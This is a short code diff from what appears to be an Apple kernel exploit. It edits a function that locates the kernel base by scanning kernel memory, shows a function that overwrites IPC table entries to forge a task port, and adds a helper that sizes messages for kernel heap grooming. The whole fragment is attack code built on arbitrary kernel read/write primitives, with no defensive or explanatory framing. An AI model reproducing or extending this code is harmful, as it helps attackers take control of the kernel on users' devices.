@@ -41,7 +41,7 @@ uint64_t find_kernel_base() {
   uint64_t base = realhost & ~0xfffULL;
   // walk down to find the magic:
   for (int i = 0; i < 0x10000; i++) {
-    if (ReadKernel32(base) == 0xfeedfacf) {
+    if (ReadKernel32(base) == MACH_HEADER_MAGIC) {
       return base;
     }
     base -= 0x1000;
@@ -132,4 +132,8 @@ mach_port_t proc_to_task_port(uint64_t proc, uint64_t our_proc) {
     WriteKernel32(ipc_table + ((p >> 8) * 0x18) + 8, ie_bits);
     
     return p;
+}
+
+int message_size_for_kalloc_size(int kalloc_size) {
+    return ((3*kalloc_size)/4) - 0x74;
 }
